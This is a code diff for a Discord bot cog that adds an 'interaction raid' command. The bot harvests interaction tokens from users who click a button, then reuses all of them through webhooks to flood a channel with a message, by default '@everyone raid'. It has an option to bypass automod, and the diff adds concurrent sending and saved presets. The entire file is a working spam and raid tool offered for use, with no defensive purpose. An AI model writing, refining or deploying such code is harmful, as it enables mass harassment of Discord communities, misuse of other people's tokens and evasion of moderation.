@@ -1,5 +1,6 @@
-import uuid
+import asyncio
 import discord
+from discord.ext.commands import Cog
 from discord import ButtonStyle
 from discord.enums import (
     SeparatorSpacingSize,
@@ -7,7 +8,7 @@ from discord.enums import (
     IntegrationType
 )
 from discord.commands import (
-    slash_command as v4,
+    slash_command as command,
     Option,
     ApplicationContext
 )
@@ -15,34 +16,17 @@ from discord.ui import (
     DesignerView,
     TextDisplay,
     Container,
-    Separator,
     ActionRow,
+    Separator,
     Button
 )
-from discord.ext.commands import Cog
 from utils.cache import diskstore
-from msgspec import Struct as struct
+from utils.db import db
+from models.user import UserData
+from models.interaction_raid import raidstate, raidtoken
 from contextlib import suppress
-from asyncio import sleep
 
-class raidstate(
-    struct,
-    kw_only=True
-):
-    message: str = "@everyone raid"
-    cooldown: float = 0.1
-    silent: bool = False
-    bypass: bool = False
-    sent: int = 0
-
-class raidtoken(
-    struct,
-    kw_only=True
-):
-    id: str
-    token: str
-
-class raid(Cog):
+class interactionraid(Cog):
     def __init__(self, bot):
         self.bot = bot
         self.states = diskstore(
@@ -50,19 +34,18 @@ class raid(Cog):
             limit=1000,
             mode="lru"
         )
+        self._stores: dict[int, diskstore] = {}
         self.farm_id = "v4:raid:farm"
         self.send_id = "v4:raid:send"
 
     def _get_store(self, cid: int) -> diskstore:
-        return diskstore(
-            filepath=f"tokens_{cid}.bin",
-            limit=1000,
-            mode="lru"
-        )
-
-    @Cog.listener()
-    async def on_ready(self):
-        self.bot.add_view(self._get_view(0, 0))
+        if cid not in self._stores:
+            self._stores[cid] = diskstore(
+                filepath=f"tokens_{cid}.bin",
+                limit=1000,
+                mode="lru"
+            )
+        return self._stores[cid]
 
     def _get_view(self, tokens: int, sent: int) -> DesignerView:
         components = [
@@ -84,11 +67,20 @@ class raid(Cog):
                         custom_id=self.send_id,
                     ),
                 ),
+                colour=0xf1c40f
             ),
         ]
         return DesignerView(*components, timeout=None)
 
-    @v4(
+    async def get_presets(self, ctx: discord.AutocompleteContext):
+        user = await db.get(ctx.interaction.user.id, UserData, ttl=5.0)
+        options = ["thug"]
+        options.extend([f"PRESET: {name}" for name in user.presets])
+        
+        val = ctx.value.lower()
+        return [o for o in options if val in o.lower()][:25]
+
+    @command(
         name="interacton-raid",
         description="raid for interaction tokens",
         contexts={
@@ -108,7 +100,8 @@ class raid(Cog):
             str,
             name="message",
             description="the message to send",
-            required=True
+            required=True,
+            autocomplete=get_presets
         ),
         cooldown: Option(
             float,
@@ -129,8 +122,14 @@ class raid(Cog):
             default=False
         )
     ):
+        actual_message = message
+        if message.startswith("PRESET: "):
+            preset_name = message.replace("PRESET: ", "", 1)
+            user = await db.get(ctx.user.id, UserData)
+            actual_message = user.presets.get(preset_name, message)
+            
         state = raidstate(
-            message=message,
+            message=actual_message,
             cooldown=cooldown,
             silent=silent,
             bypass=bypass_automod
@@ -161,15 +160,28 @@ class raid(Cog):
             id=str(itx.application_id),
             token=itx.token
         )
-        await store.set(itx.token, t, 900.0)
+        await store.set(
+            itx.token,
+            t,
+            900.0
+        )
         
         state = await self.states.get(str(itx.channel_id), raidstate) or raidstate()
-        state.sent += 5
-        await self.states.set(str(itx.channel_id), state, 3600.0)
-        
         tokens = await store.get_all(raidtoken)
+        state.sent = len(tokens) * 5
+        await self.states.set(
+            str(itx.channel_id),
+            state,
+            3600.0
+        )
+        
         with suppress(Exception):
-            await itx.response.edit_message(view=self._get_view(len(tokens), state.sent))
+            await itx.response.edit_message(
+                view=self._get_view(
+                    len(tokens),
+                    state.sent
+                )
+            )
 
     async def _handle_send(self, itx: discord.Interaction):
         with suppress(Exception):
@@ -177,36 +189,65 @@ class raid(Cog):
 
         store = self._get_store(itx.channel_id)
         tokens = await store.get_all(raidtoken)
+        
+        current_t = raidtoken(
+            id=str(itx.application_id),
+            token=itx.token
+        )
+        tokens.append(current_t)
+        
         state = await self.states.get(str(itx.channel_id), raidstate) or raidstate()
         
-        view_payload = None
-        if state.bypass:
-            view_payload = [Container(TextDisplay(content=state.message)).to_dict()]
+        if not tokens:
+            return
 
-        sent = 0
-        if tokens:
-            while sent < state.sent:
-                for t in tokens:
-                    if sent >= state.sent:
-                        break
-                    with suppress(Exception):
-                        await self.bot.v4_webhook.send(
-                            content=state.message,
-                            silent=state.silent,
-                            view=view_payload,
-                            is_v2=state.bypass,
-                            application_id=t.id,
-                            token=t.token
-                        )
-                    sent += 1
-                    await sleep(state.cooldown)
-        
         await store.clear()
+        self._stores.pop(itx.channel_id, None)
         state.sent = 0
-        await self.states.set(str(itx.channel_id), state, 3600.0)
+        await self.states.set(
+            str(itx.channel_id),
+            state,
+            3600.0
+        )
         
         with suppress(Exception):
-            await itx.edit_original_response(view=self._get_view(0, 0))
+            await itx.edit_original_response(
+                view=self._get_view(
+                    0,
+                    0
+                )
+            )
+
+        view_payload = None
+        if state.bypass:
+            view_payload = [
+                Container(
+                    TextDisplay(content=state.message)
+                ).to_component_dict()
+            ]
+
+        sem = asyncio.Semaphore(2)
+
+        async def _dispatch(t: raidtoken):
+            async with sem:
+                with suppress(Exception):
+                    await self.bot.v4_webhook.send(
+                        ctx=itx,
+                        content=state.message if not state.bypass else None,
+                        silent=state.silent,
+                        view=view_payload,
+                        is_v2=state.bypass,
+                        application_id=t.id,
+                        token=t.token
+                    )
+                await asyncio.sleep(state.cooldown)
+
+        tasks = [
+            _dispatch(t)
+            for t in tokens
+            for _ in range(5)
+        ]
+        await asyncio.gather(*tasks)
 
 def setup(bot):
-    bot.add_cog(raid(bot))
+    bot.add_cog(interactionraid(bot))
